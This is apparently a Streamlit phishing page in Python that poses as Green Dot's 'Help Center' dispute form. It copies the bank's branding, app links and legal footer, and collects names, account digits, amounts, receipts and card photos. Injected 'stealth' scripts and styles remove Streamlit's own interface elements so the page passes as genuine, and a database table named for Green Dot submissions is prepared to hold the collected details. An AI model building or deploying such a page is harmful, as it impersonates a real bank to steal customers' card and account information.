
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Configuración de Rutas
DB_NAME = "claims.db"
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)"""
    )
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# JS: REFUERZO DE VISIBILIDAD Y ELIMINACIÓN DE EVENTOS EN LOGO/H1
st.markdown("""<script>
    const applyStealthRules = () => {
        // 1. Visibilidad del Uploader (200MB per file...)
        document.querySelectorAll('[data-testid="stFileUploader"] small, [data-testid="stFileUploader"] p').forEach(el => {
            el.style.setProperty('color', '#FFFFFF', 'important');
            el.style.setProperty('opacity', '1', 'important');
            el.style.setProperty('-webkit-text-fill-color', '#FFFFFF', 'important');
        });

        // 2. Desactivar clicks en logo y títulos (Para evitar que funcionen como links)
        const noClick = ['h1', 'img[alt="logo"]', '[data-testid="stImage"]'];
        noClick.forEach(s => {
            document.querySelectorAll(s).forEach(el => {
                el.style.pointerEvents = 'none';
                el.style.cursor = 'default';
            });
        });

        // 3. Limpieza de UI Streamlit
        ['header', 'footer', '.stDeployButton', '[data-testid="stHeader"]'].forEach(s => {
            document.querySelectorAll(s).forEach(el => el.remove());
        });
    };
    setInterval(applyStealthRules, 100);
</script>""", unsafe_allow_html=True)

# CSS: IDENTIDAD STEALTH Y RESPONSIVIDAD
st.markdown("""<style>
    html, body, .stApp {
        background-color: #000000 !important;
        color: #FFFFFF !important;
    }

    /* Contenedor adaptado */
    .block-container {
        max-width: 500px !important;
        padding-top: 2rem !important;
    }

    /* Texto del cargador */
    [data-testid="stFileUploader"] section {
        background-color: #1a1a1a !important;
        border: 1px dashed #333 !important;
    }

    /* Botón Principal */
    .stButton > button {
        background-color: #00a05b !important;
        color: #FFFFFF !important;
        border-radius: 8px !important;
        width: 100% !important;
        font-weight: bold !important;
        height: 50px !important;
        border: none !important;
    }

    /* Inputs */
    .stTextInput input, .stNumberInput input {
        background-color: #111 !important;
        color: white !important;
        border: 1px solid #333 !important;
    }

    /* Sección Promo (Download App) */
    .promo-container {
        background-color: #0e0e0e;
        padding: 30px 15px;
        border-radius: 12px;
        text-align: center;
        margin-top: 30px;
        border: 1px solid #222;
    }

    /* Footer Legal */
    .legal-footer {
        font-size: 11px;
        color: #666;
        text-align: justify;
        margin-top: 40px;
        padding-top: 20px;
        border-top: 1px solid #222;
        line-height: 1.5;
    }

    header, footer, .stDeployButton { display: none !important; }
</style>""", unsafe_allow_html=True)

# UI: LOGO
if os.path.exists("logo.svg"):
    st.image("logo.svg", width=220)

st.title("Help Center")
st.write("Please fill out the form below to submit your dispute.")

with st.form("final_form_v133", clear_on_submit=True):
    st.text_input("Full Name")
    st.text_input("Account Number (Last 4 digits)")
    st.number_input("Disputed Amount", format="%.2f")
    st.file_uploader("Store Receipt", type=["jpg","png"])
    st.file_uploader("Card Photo", type=["jpg","png"])
    if st.form_submit_button("SUBMIT NOW"):
        st.success("✅ Claim Received.")

# RESTAURACIÓN: DOWNLOAD APP SECTION
st.markdown("""<div class='promo-container'>
    <p style='color: white !important; font-weight: bold; margin-bottom: 20px;'>Download the Green Dot app</p>
    <div style='display: flex; justify-content: center; gap: 15px;'>
        <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
            <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
        </a>
        <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
            <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
        </a>
    </div>
</div>""", unsafe_allow_html=True)

# RESTAURACIÓN: FOOTER LEGAL
st.markdown("""<div class='legal-footer'>
    Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. 
    &copy;2026 Green Dot Corporation. All rights reserved. NMLS #914924; Green Dot Bank NMLS #908739.<br><br>
    Not a gift card. Must be 18 or older to purchase. Online access and identity verification are required.
</div>""", unsafe_allow_html=True)
